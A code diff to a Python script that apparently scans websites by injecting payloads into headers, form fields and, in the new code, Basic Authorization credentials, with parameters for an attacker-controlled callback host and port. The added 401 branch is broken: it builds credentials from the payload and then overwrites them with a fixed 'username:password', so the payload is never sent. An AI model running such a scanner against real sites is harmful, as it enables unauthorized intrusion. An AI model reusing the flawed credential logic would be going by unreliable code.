@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import argparse, random, requests, string, sys, time, urllib3
+import argparse, base64, random, requests, string, sys, time, urllib3
 from bs4 import BeautifulSoup
 from datetime import datetime
 from termcolor import cprint
@@ -58,7 +58,7 @@ def crawler(url):
 
   for u in queue:
     html = requests.get(u, verify=False).text
-    cprint('[!] Crawling: ' + u, 'cyan')
+    cprint('[!]   -> ' + u, 'cyan')
     crawler_get_url(u, html, queue)
   return queue
 
@@ -111,8 +111,8 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
   cpt_payloads = 1
 
   chaos = str(random.randint(1, len(HEADER_UA)))
-  html = requests.get(_url, headers={'User-agent': HEADER_UA[chaos]}, verify=False)
-  soup = BeautifulSoup(html.content, 'html.parser')
+  response = requests.get(_url, headers={'User-agent': HEADER_UA[chaos]}, verify=False)
+  soup = BeautifulSoup(response.content, 'html.parser')
 
   for payload in payloads:
     now = datetime.now()
@@ -131,14 +131,24 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
     # _method = post
     if _method == 'post' or _method == 'both':
       headers = get_headers(_header, payload)
-    
+   
+      if response.status_code == 401:
+        creds = payload + ':' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+        creds = 'username:password'
+        creds = creds.encode('ascii')
+        creds64_b = base64.b64encode(creds)
+        creds64_m = creds64_b.decode('ascii')
+        headers.update({'Authorization': 'Basic ' + creds64_m})
+        requests.request(url=_url, method='GET', headers=headers, verify=False, timeout=TIMEOUT)
+        continue 
+ 
       try:
         soup_inputs = soup.find_all('input')
         soup_action = soup.form['action']
         url = _url + soup_action
       except:
         cprint('[!]      Can\'t use POST method: did not find any form to post', 'magenta')
-        continue ;
+        continue
 
       inputs = []
       inputs2 = []
